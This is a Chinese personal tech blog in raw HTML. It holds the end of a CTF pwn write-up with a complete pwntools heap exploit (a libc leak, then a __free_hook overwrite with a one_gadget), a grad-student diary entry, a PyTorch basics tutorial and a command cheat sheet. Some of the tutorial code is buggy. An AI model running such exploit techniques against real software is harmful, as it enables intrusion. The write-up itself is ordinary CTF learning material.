+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">成功</span><br><span class="line"></span><br><span class="line">## 完整exp</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+<p>from pwn import *<br>p &#x3D; process(‘.&#x2F;pwn2’,aslr&#x3D;2)<br>elf &#x3D; ELF(“.&#x2F;pwn2”, checksec&#x3D;False)<br>libc &#x3D; ELF(‘&#x2F;lib&#x2F;x86_64-linux-gnu&#x2F;libc.so.6’, checksec&#x3D;False)<br>#context.log_level &#x3D; “debug”<br>def new(title,name,size,message):<br>	p.sendafter(‘Input your choice:’,’1’)<br>	p.sendafter(‘title:\n’,title)<br>	p.sendafter(‘name:\n’,name)<br>	p.sendafter(‘message size:\n’,str(size))<br>	p.sendafter(‘message:\n’,message)<br>def edit(ind,size,message):<br>	p.sendafter(‘Input your choice:’,’2’)<br>	p.sendafter(‘Which one?\n’,str(ind))<br>	p.sendafter(‘message size:\n’,str(size))<br>	p.sendafter(‘new message:\n’,message)<br>def show(ind):<br>	p.sendafter(‘Input your choice:’,’3’)<br>	p.sendafter(‘Which one?\n’,str(ind))<br>def free(ind):<br>	p.sendafter(‘Input your choice:’,’4’)<br>	p.sendafter(‘Which one?\n’,str(ind))</p>
+<p>new(‘a’,’a’,0x80,’a’*0x80)<br>new(‘b’,’b’,1,’b’)<br>edit(0,0x90,’1’*8)<br>new(‘d’,’d’,0x80,’d’*8)<br>show(2)<br>p.recvuntil(‘Title: ‘)<br>leak &#x3D; u64(p.recvuntil(‘\n’)[:-1].ljust(8,”\x00”))-0x3c4b64<br>print hex(leak)<br>new(‘a’,’a’,0xf7,’a’*0x20)<br>edit(3,0xb8,’0’)<br>new(‘d’,’d’,1,’d’)<br>edit(3,0xb8,’\x01’*0xc8+p64(0x31)*4+p64(libc.symbols[‘__free_hook’] + leak)+p64(0x51))<br>one&#x3D;leak+0x4526a<br>edit(4,0x51,p64(one))<br>free(0)<br>p.interactive()</p>
+<pre><code>
+最后构造出来的块太恶心了,但还好成功了,本题难点就是内容头数据结构和 realloc 的理解了,剩下没什么难点,算是一个比较考构造的题
+</code></pre>
+
+      
+    </div>
+    <footer class="article-footer">
+      <a data-url="http://example.com/2022/01/02/2022-01-02-pwnbeginer/" data-id="cuidLea4PnUjNsVF99qJm-f5E" data-title="pwn 新手向" class="article-share-link"><span class="fa fa-share">Share</span></a>
+      
+      
+      
+    </footer>
+  </div>
+  
+</article>
+
+
+
+  
+    <article id="post-2021-10-04-lately" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
+  <div class="article-meta">
+    <a href="/2021/10/04/2021-10-04-lately/" class="article-date">
+  <time class="dt-published" datetime="2021-10-03T16:00:00.000Z" itemprop="datePublished">2021-10-04</time>
+</a>
+    
+  </div>
+  <div class="article-inner">
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="p-name article-title" href="/2021/10/04/2021-10-04-lately/">研一</a>
+    </h1>
+  
+
+      </header>
+    
+    <div class="e-content article-entry" itemprop="articleBody">
+      
+        <h2 id="10-4"><a href="#10-4" class="headerlink" title="10.4"></a>10.4</h2><p>今天是 2021 年国庆假期第四天，也刚好是来西电的第一个月，这一个月经历了许多大学时候想都没想过的事情，总之，还是十分…自闭的😢。</p>
+<p>读研和本科期间真是差了太多太多了，我到现在还没确定自己的专业方向，自己在床上看着舍友敲代码到半夜一两点，上课期间也不咋认真听讲，纯纯的躺平了。就现在看点<br>深度学习 的东西。</p>
+<p>其实到现在我也不知道自己当时做的选择对不对：如果当时没考上的话，我现在可能在 360 搞 iot ？又或者是去珠海那边搞芯片？又甚至是二战？</p>
+<p>不知道为什么本科期间我的目标很明确，就是学安全，每天除了实验室就是教室食堂。而到了读研期间，自己反而懈怠了。有时候觉得自己其实不配考上，我都不知道自己怎么考上的。自己恐怕是真的适合考试突击，然后不会研究的 菜鸡 罢了。</p>
+<p>截至目前，自己的兴趣点还是 ai 结合安全的东西。上次参加云安全峰会时候西交的老师给我印象太深了，他们研究的和我想干的完完全全重合，就是研究 ai 框架底下的安全问题，而且我特别特别感兴趣。<br>自己要是搞的话不知道路线怎么走，所以现在还是按部就班的学习，成长的很慢。但是好歹也是找到了自己目前喜欢的，研一上还是这样吧，找方向，然后学课内的东西，加油。</p>
+<h2 id="10-27"><a href="#10-27" class="headerlink" title="10.27"></a>10.27</h2><p>觉得自己还是太安逸了，每天学学课上的东西，然后课下看一丢丢 ML 的东西，之前的基本功全丢了。</p>
+<p>从今天开始学东西吧，还是拿大学的模式，这个月好好看看比赛的事情，研究生三年我想把重点还是放在比赛上，以赛促学，毕竟自己是真的只会做题。然后每天在这上边写总结和复盘吧。开整</p>
+<h2 id="12-6"><a href="#12-6" class="headerlink" title="12.6"></a>12.6</h2><p>一晃这么快，已经 3 个月了，自己感觉已经入门了，也开始知道干啥了，很舒服。现在学了不少东西，还得继续，下面列一波自己清单</p>
+<ul>
+<li><del>PR</del></li>
+<li><del>《Python数据分析》</del></li>
+<li><del>寻找喜欢的方向</del></li>
+<li>《统计学习方法》</li>
+<li>《神经网络与深度学习》</li>
+<li><del>cs231n</del>，还差2节作业</li>
+<li>天池比赛真题(ml和dl的)</li>
+</ul>
+<p>然后还有些 C&#x2F;C++ 框架</p>
+<ul>
+<li><a target="_blank" rel="noopener" href="https://sourceforge.net/projects/cjson">cjson</a></li>
+<li><a target="_blank" rel="noopener" href="https://github.com/EZLippi/Tinyhttpd">Tinyhttpd</a></li>
+<li><a target="_blank" rel="noopener" href="https://github.com/Alinshans/MyTinySTL">MyTinySTL</a></li>
+<li><a target="_blank" rel="noopener" href="https://github.com/oatpp/oatpp">oatpp</a></li>
+<li><a target="_blank" rel="noopener" href="https://redis.io/download">Redis</a></li>
+<li><a target="_blank" rel="noopener" href="http://nginx.org/">nginx</a></li>
+<li>fuzz</li>
+</ul>
+<h2 id="12-7"><a href="#12-7" class="headerlink" title="12.7"></a>12.7</h2><p>今天看着个大佬的<a target="_blank" rel="noopener" href="https://www.bilibili.com/video/BV1b54y177NW">视频</a>，手撸了一个对抗样本的算法，有各种 bug ，但思想啥的懂了，而且 jupyter 也太好用了八，把 pycharm 扔一边了暂时。现在这几天应该滚去写作业了，<del>五项作业</del>，这周争取一天整完一项。</p>
+<h2 id="12-12"><a href="#12-12" class="headerlink" title="12.12"></a>12.12</h2><p>这几天看了好多好多安全的视频，我实在放不下。同时也把 django 整了整，真好玩啊。以后卷不动 CV 了就去干后端。今天写完两个作业，就是一顿敲代码，虽然还是有 bug ，但应付作业还是够了。明天后天得把随机过程作业写完，我这零基础，慌的一批啊。</p>
+<h2 id="12-16"><a href="#12-16" class="headerlink" title="12.16"></a>12.16</h2><p>这周基本全结课了，就剩一门工优了。剩下这几周就是复习了，同时学点东西。最近不知道为啥，对后端贼感兴趣，这几天时间看了 <del>nodejs redis django electron ajax</del> ，上课也在看，根本停不下来那种。不行不行，这样下去必挂科。列一下寒假要干的事（还挺多），然后安心复习：</p>
+<ul>
+<li>本职工作：看两本书、写两组项目、文献、coding</li>
+<li>看 C、Linux kernel、Web 挖洞</li>
+<li>学学剪视频</li>
+<li>篮球</li>
+<li>English</li>
+</ul>
+<h2 id="12-17"><a href="#12-17" class="headerlink" title="12.17"></a>12.17</h2><p>今天上午看了点后端的，中午区块链。看了点随机过程是真没劲啊。下午我就是个傻逼，网上找了个 Django 项目，结果搭环境搭了半天，就很离谱， requirement.txt 好多没写的，然后 pycharm 我也不太会，环境彻底乱了。俺也不管了，索性不管虚拟情况了，直接 pip install 。没装mysql，改！上sqlite3！django版本太高，卸！上3.0！报啥错装啥库，┭┮﹏┭┮。最后终于魔改好了，有项目看了。晚上就看这个🤭，复习不存在的。</p>
+<h2 id="12-31"><a href="#12-31" class="headerlink" title="12.31"></a>12.31</h2><p>前几天重装了一波系统，东西啥的都没了，也正好清空了清空，自己之前的好多东西选择暂时性忘记。今年最后一天，封闭在宿舍，考试也推迟到解封了，不太想复习了已经。今天晚上好好看看方向的东西，想学的真是有点多，ai、blockchain、kernel、iot还有 SRC 也想挖挖。今天晚上纠结纠结，明天我不管了，开启寒假作息，弱化复习，直接高强度学东西。</p>
+<p>大致方向有三个：ai、kernel、SRC。目前还是想走一走交叉，今天再看看吧。</p>
+
+      
+    </div>
+    <footer class="article-footer">
+      <a data-url="http://example.com/2021/10/04/2021-10-04-lately/" data-id="cuid2GTIL-o8v_LNDZQVTUWPe" data-title="研一" class="article-share-link"><span class="fa fa-share">Share</span></a>
+      
+      
+      
+  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/chat/" rel="tag">chat</a></li></ul>
+
+    </footer>
+  </div>
+  
+</article>
+
+
+
+  
+    <article id="post-2021-09-20-pytorch_sty" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
+  <div class="article-meta">
+    <a href="/2021/09/20/2021-09-20-pytorch_sty/" class="article-date">
+  <time class="dt-published" datetime="2021-09-19T16:00:00.000Z" itemprop="datePublished">2021-09-20</time>
+</a>
+    
+  </div>
+  <div class="article-inner">
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="p-name article-title" href="/2021/09/20/2021-09-20-pytorch_sty/">PYTORCH大法</a>
+    </h1>
+  
+
+      </header>
+    
+    <div class="e-content article-entry" itemprop="articleBody">
+      
+        <h2 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h2><blockquote>
+<p>Windows 端</p>
+</blockquote>
+<p>有了 anaconda 使得我们的环境搭建变得十分简单，有两种方案，一种是使用 conda 的方式创建一个专门给 pytorch 的库，还可以直接在 pip 下全局安装 pytorch 。我使用的第二种，因为使用第一种每次要想使用 pytorch 的话还得重新使用 activate 的方式进入 pytorch。</p>
+<p>跟着<a target="_blank" rel="noopener" href="https://www.bilibili.com/video/BV18K411w7Vs">李沐大大的安装配置指南</a>，光速完成</p>
+<h2 id="线性模型"><a href="#线性模型" class="headerlink" title="线性模型"></a>线性模型</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line">import numpy as np</span><br><span class="line">import matplotlib.pyplot as plt</span><br><span class="line">x_data = [1.0, 2.0, 3.0]</span><br><span class="line">y_data = [2.0, 4.0, 6.0]</span><br><span class="line"></span><br><span class="line">def forward(x):</span><br><span class="line">    return x*w</span><br><span class="line">#线性关系</span><br><span class="line"></span><br><span class="line">def loss(x, y):</span><br><span class="line">#损失函数</span><br><span class="line">    y_pred = forward(x)</span><br><span class="line">    return (y_pred - y) * (y_pred - y)</span><br><span class="line"></span><br><span class="line">w_list = []</span><br><span class="line">mse_list = []</span><br><span class="line"></span><br><span class="line">#遍历找w</span><br><span class="line">for w in np.arange(0.0, 4.1, 0.1):</span><br><span class="line">    print(&#x27;w=&#x27;, w)</span><br><span class="line">    l_sum=0</span><br><span class="line">    for x_val,y_val in zip(x_data,y_data):</span><br><span class="line">        y_pred_val = forward(x_val)</span><br><span class="line">        loss_val = loss(x_val,y_val)</span><br><span class="line">        l_sum+=loss_val</span><br><span class="line">        print(&#x27;\t&#x27;,x_val,y_val,y_pred_val,loss_val)</span><br><span class="line">    print(&#x27;MSE=&#x27;,l_sum/3)</span><br><span class="line">    w_list.append(w)</span><br><span class="line">    mse_list.append(l_sum/3)</span><br><span class="line"></span><br><span class="line">plt.plot(w_list,mse_list)</span><br><span class="line">plt.ylabel(&#x27;loss&#x27;)</span><br><span class="line">plt.xlabel(&#x27;w&#x27;)</span><br><span class="line">plt.show()</span><br></pre></td></tr></table></figure>
+
+<p>这是一个十分简单的数学模型，参数 b 甚至考虑，当然可以加上，但是算出来肯定也是 0。</p>
+<h2 id="梯度下降算法"><a href="#梯度下降算法" class="headerlink" title="梯度下降算法"></a>梯度下降算法</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line">import numpy as np</span><br><span class="line">import matplotlib.pyplot as plt</span><br><span class="line">x_data = [1.0, 2.0, 3.0]</span><br><span class="line">y_data = [2.0, 4.0, 6.0]</span><br><span class="line"></span><br><span class="line">w=1.0</span><br><span class="line">def forward(x):</span><br><span class="line">    return x*w</span><br><span class="line">#线性关系</span><br><span class="line"></span><br><span class="line">def cost(xs, ys):</span><br><span class="line">    cost=0</span><br><span class="line">    for x,y in zip(xs,ys):</span><br><span class="line">        y_pred = forward(x)</span><br><span class="line">        cost+=(y_pred - y) ** 2</span><br><span class="line">        return cost/len(xs)</span><br><span class="line"></span><br><span class="line">def gradient(xs, ys):</span><br><span class="line">    grad=0</span><br><span class="line">    for x,y in zip(xs,ys):</span><br><span class="line">        grad+=2*x*(x*w-y)</span><br><span class="line">        return grad/len(xs)</span><br><span class="line">epoch_list = []</span><br><span class="line">cost_list = []</span><br><span class="line">print(&#x27;Predict(before traning)&#x27;,4,forward(4))</span><br><span class="line">#遍历找w</span><br><span class="line">for epoch in range(500):</span><br><span class="line">   cost_val=cost(x_data,y_data)</span><br><span class="line">   grad_val=gradient(x_data,y_data)</span><br><span class="line">   w-=0.01*grad_val</span><br><span class="line">   print(&#x27;Eopch:&#x27;,epoch,&#x27;w=&#x27;,w,&#x27;cost=&#x27;,cost_val)</span><br><span class="line">   epoch_list.append(epoch)</span><br><span class="line">   cost_list.append(cost_val)</span><br><span class="line">print(&#x27;Predict(after traning)&#x27;,4,forward(4))</span><br><span class="line"></span><br><span class="line">plt.plot(epoch_list,cost_list)</span><br><span class="line">plt.ylabel(&#x27;cost_val&#x27;)</span><br><span class="line">plt.xlabel(&#x27;epoch&#x27;)</span><br><span class="line">plt.show()</span><br></pre></td></tr></table></figure>
+
+<p>梯度下降算法，取了个均值平均损失，但是其实挺菜的，如果存在鞍点的话，这种下降方式所算的导数就为 0 了， w 无法迭代更新。这时候随机梯度下降就出现了。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line">import numpy as np</span><br><span class="line">import matplotlib.pyplot as plt</span><br><span class="line">x_data = [1.0, 2.0, 3.0]</span><br><span class="line">y_data = [2.0, 4.0, 6.0]</span><br><span class="line"></span><br><span class="line">w=1.0</span><br><span class="line">def forward(x):</span><br><span class="line">    return x*w</span><br><span class="line">#线性关系</span><br><span class="line"></span><br><span class="line">def loss(xs, ys):</span><br><span class="line">    y_pred = forward(x)</span><br><span class="line">    return (y_pred - y) ** 2</span><br><span class="line"></span><br><span class="line">def gradient(xs, ys):</span><br><span class="line">    return 2* x * (x * w - y)</span><br><span class="line"></span><br><span class="line">epoch_list = []</span><br><span class="line">loss_list = []</span><br><span class="line">print(&#x27;Predict(before traning)&#x27;,4,forward(4))</span><br><span class="line">#遍历找w</span><br><span class="line">for epoch in range(50):</span><br><span class="line">    for x, y in zip(x_data, y_data):</span><br><span class="line">        grad=gradient(x,y)</span><br><span class="line">        w-=0.01*grad</span><br><span class="line">        print(&#x27;\tgrad:&#x27;,x,y,grad)</span><br><span class="line">        l=loss(x,y)</span><br><span class="line">        epoch_list.append(epoch)</span><br><span class="line">        loss_list.append(l)</span><br><span class="line">    print(&#x27;progress:&#x27;,epoch,&#x27;w=&#x27;,w,&#x27;loss=&#x27;,l)</span><br><span class="line"></span><br><span class="line">print(&#x27;Predict(after traning)&#x27;,4,forward(4))</span><br><span class="line"></span><br><span class="line">plt.plot(epoch_list,loss_list)</span><br><span class="line">plt.ylabel(&#x27;loss_list&#x27;)</span><br><span class="line">plt.xlabel(&#x27;epoch&#x27;)</span><br><span class="line">plt.show()</span><br></pre></td></tr></table></figure>
+
+<p>这个迭代速度超级快，而且极其不平滑。这个算法优点就是能够通过部分噪点的小影响来度过一个鞍点。</p>
+<h2 id="反向传播"><a href="#反向传播" class="headerlink" title="反向传播"></a>反向传播</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">import torch</span><br><span class="line">x_data = [1.0, 2.0, 3.0]</span><br><span class="line">y_data = [2.0, 4.0, 6.0]</span><br><span class="line"></span><br><span class="line">w=torch.Tensor([1.0])</span><br><span class="line">w.requires_grad=True</span><br><span class="line"></span><br><span class="line">def forward(x):</span><br><span class="line">    return x*w</span><br><span class="line">#线性关系</span><br><span class="line"></span><br><span class="line">def loss(x, y):</span><br><span class="line">    y_pred = forward(x)</span><br><span class="line">    return (y_pred - y) ** 2</span><br><span class="line"></span><br><span class="line">epoch_list = []</span><br><span class="line">cost_list = []</span><br><span class="line">print(&#x27;Predict(before traning)&#x27;,4,forward(4).item())</span><br><span class="line">#遍历找w</span><br><span class="line">for epoch in range(500):</span><br><span class="line">    for x, y in zip(x_data, y_data):</span><br><span class="line">        l=loss(x,y)</span><br><span class="line">        l.backward()</span><br><span class="line">        print(&#x27;\tgrad:&#x27;,x,y,w.grad.item())</span><br><span class="line">        w.data=w.data-0.01*w.grad.data</span><br><span class="line">        w.grad.data.zero_()</span><br><span class="line">    print(&#x27;progress:&#x27;,epoch,l.item())</span><br><span class="line">print(&#x27;Predict(after traning)&#x27;,4,forward(4).item())</span><br></pre></td></tr></table></figure>
+
+      
+    </div>
+    <footer class="article-footer">
+      <a data-url="http://example.com/2021/09/20/2021-09-20-pytorch_sty/" data-id="cuidrkKVr2Ajb1Jj4YnvAPk7w" data-title="PYTORCH大法" class="article-share-link"><span class="fa fa-share">Share</span></a>
+      
+      
+      
+  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/ai/" rel="tag">ai</a></li></ul>
+
+    </footer>
+  </div>
+  
+</article>
+
+
+
+  
+    <article id="post-2021-07-01-commands" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
+  <div class="article-meta">
+    <a href="/2021/07/01/2021-07-01-commands/" class="article-date">
+  <time class="dt-published" datetime="2021-06-30T19:18:21.000Z" itemprop="datePublished">2021-07-01</time>
+</a>
+    
+  <div class="article-category">
+    <a class="article-category-link" href="/categories/tools/">tools</a>
+  </div>
+
+  </div>
+  <div class="article-inner">
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="p-name article-title" href="/2021/07/01/2021-07-01-commands/">各种小命令（防遗忘</a>
+    </h1>
+  
+
+      </header>
+    
+    <div class="e-content article-entry" itemprop="articleBody">
+      
+        <h1 id="python"><a href="#python" class="headerlink" title="python"></a>python</h1><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python -m http.server 80</span><br></pre></td></tr></table></figure>
+<h1 id="git"><a href="#git" class="headerlink" title="git"></a>git</h1><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">git init</span><br><span class="line">git add .</span><br><span class="line">git commit -m &quot;just modify something fist time&quot;</span><br><span class="line">git remote add origin remoteurl</span><br><span class="line">git push -u origin master</span><br><span class="line">git remote rm origin</span><br></pre></td></tr></table></figure>
+<h1 id="conda"><a href="#conda" class="headerlink" title="conda"></a>conda</h1><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">conda info -e</span><br><span class="line">conda list</span><br><span class="line">conda create -n name what_you_want_to_pip</span><br><span class="line">conda activate name</span><br><span class="line">conda clean -i</span><br><span class="line">conda remove -n name --all</span><br></pre></td></tr></table></figure>
+<h1 id="docker"><a href="#docker" class="headerlink" title="docker"></a>docker</h1><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">rm -f $(id) #删除容器</span><br><span class="line">rmi         #删除镜像</span><br><span class="line">commit $(id) $(镜像名) #提交镜像</span><br><span class="line">参数</span><br><span class="line">-d  #后台运行</span><br><span class="line">-v  #外部路径:内部路径</span><br><span class="line">-p  #映射外端口:内端口</span><br><span class="line">-it #创建一个可接受输入的终端</span><br><span class="line"># linux docker for pwn</span><br><span class="line">docker run -it --rm --name testctf -v $(pwd):/ctf/work \</span><br><span class="line">--privileged --cap-add=SYS_PRTACE skysider/pwndocker sh</span><br><span class="line">    </span><br><span class="line"># windows（but `chdir` should exec before</span><br><span class="line">docker run -it --rm --name testctf -v $(chdir):/ctf/work \</span><br><span class="line">--privileged --cap-add=all skysider/pwndocker sh</span><br><span class="line">    </span><br><span class="line"># wiki</span><br><span class="line">docker run -d --name=ctf-wiki -p 4100:80 ctfwiki/ctf-wiki</span><br><span class="line"></span><br><span class="line"># jekyll</span><br><span class="line">docker run -it --rm -v $(pwd):/srv/jekyll -p 4000:4000 sh</span><br></pre></td></tr></table></figure>
+
+<h1 id="makefile"><a href="#makefile" class="headerlink" title="makefile"></a>makefile</h1><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">CC = gcc</span><br><span class="line">CFLAGS = -lm -Wall -g</span><br><span class="line"></span><br><span class="line">all: main_max main_min</span><br><span class="line"></span><br><span class="line">main_max: main_max.c foo.o bar.o</span><br><span class="line">	$(CC) $(CFLAGS) main_max.c foo.o bar.o -o main_max</span><br><span class="line"></span><br><span class="line">main_min: main_min.c foo.o bar.o</span><br><span class="line">	$(CC) $(CFLAGS) main_min.c foo.o bar.o -o main_min</span><br><span class="line"></span><br><span class="line">foo.o: foo.c</span><br><span class="line">	$(CC) $(CFLAGS) -c foo.c</span><br><span class="line">	</span><br><span class="line">bar.o: bar.c</span><br><span class="line">	$(CC) $(CFLAGS) -c bar.c</span><br><span class="line"></span><br><span class="line">clean:</span><br><span class="line">	rm *.o main</span><br></pre></td></tr></table></figure>
+
+<h1 id="tmux"><a href="#tmux" class="headerlink" title="tmux"></a>tmux</h1><pre><code>ctrl + B
+        --&gt; Arrow keys//to chooce the correct panel
+        --&gt; Pgup/Pgdn//rolling screen
+</code></pre>
+<h1 id="python-1"><a href="#python-1" class="headerlink" title="python"></a>python</h1><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">import base64# 修改表映射</span><br><span class="line">a = &quot;QWERTYUIOPASDFGHJKLZXCVBNMqwertyuiopasdfghjklzxcvbn/+m1234567890&quot;</span><br><span class="line">b = &quot;ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/&quot;</span><br><span class="line">base_fix = &quot;ZXFWtmKgDZCyrmC5B+CiVfsyXUCQVfsyZRFzDU4yX2YCD/F5Ih8=&quot;</span><br><span class="line">table = &#x27;&#x27;.maketrans(a, b)</span><br><span class="line">print(base64.b64decode(base_fix.translate(table)))</span><br><span class="line"></span><br><span class="line">f = open(&quot;Amazon&quot;)</span><br><span class="line">a=f.read()</span><br><span class="line">sp = a.splitlines()</span><br><span class="line">b=[]</span><br><span class="line">for i in sp:</span><br><span class="line">	c = i.split(&quot;\t&quot;)</span><br><span class="line">	b.append(c)</span><br><span class="line">print(len(b))</span><br><span class="line">d = b[0][0]</span><br><span class="line">print(1)</span><br><span class="line">print(1&gt;100)</span><br><span class="line">c=[]</span><br><span class="line">d=[]</span><br><span class="line">for i in b:</span><br><span class="line">	if int(i[0])&lt;100 and int(i[1])&lt;100:</span><br><span class="line">		c.append(i[0]+&quot;\t&quot;+i[1]+&quot;\n&quot;)</span><br><span class="line">f = open(&quot;guo&quot;, &quot;w+&quot;)</span><br><span class="line">for i in c:</span><br><span class="line">	f.write(i)</span><br><span class="line">f.close()</span><br></pre></td></tr></table></figure>
+
+<h1 id="PR-这是什么奇怪的东西"><a href="#PR-这是什么奇怪的东西" class="headerlink" title="PR(这是什么奇怪的东西)"></a>PR(这是什么奇怪的东西)</h1><ul>
+<li>卡点插件</li>
+<li>字幕</li>
+<li>转场</li>
+<li>轨道遮罩</li>
+</ul>
+<h1 id="Pwndocker"><a href="#Pwndocker" class="headerlink" title="Pwndocker"></a>Pwndocker</h1><p>A docker environment for pwn in ctf based on <strong>phusion&#x2F;baseimage:master-amd64</strong>, which is a modified ubuntu 18.04 baseimage for docker</p>
+<h3 id="Usage"><a href="#Usage" class="headerlink" title="Usage"></a>Usage</h3><pre><code>docker run -d \
+	--rm \
+	-h ${ctf_name} \
+	--name ${ctf_name} \
+	-v $(pwd)/${ctf_name}:/ctf/work \
+	-p 23946:23946 \
+	--cap-add=SYS_PTRACE \
+	skysider/pwndocker
+
+docker exec -it ${ctf_name} /bin/bash
+</code></pre>
+<h3 id="included-software"><a href="#included-software" class="headerlink" title="included software"></a>included software</h3><ul>
+<li><a target="_blank" rel="noopener" href="https://github.com/Gallopsled/pwntools">pwntools</a>  —— CTF framework and exploit development library</li>
+<li><a target="_blank" rel="noopener" href="https://github.com/pwndbg/pwndbg">pwndbg</a>  —— a GDB plug-in that makes debugging with GDB suck less, with a focus on features needed by low-level software developers, hardware hackers, reverse-engineers and exploit developers</li>
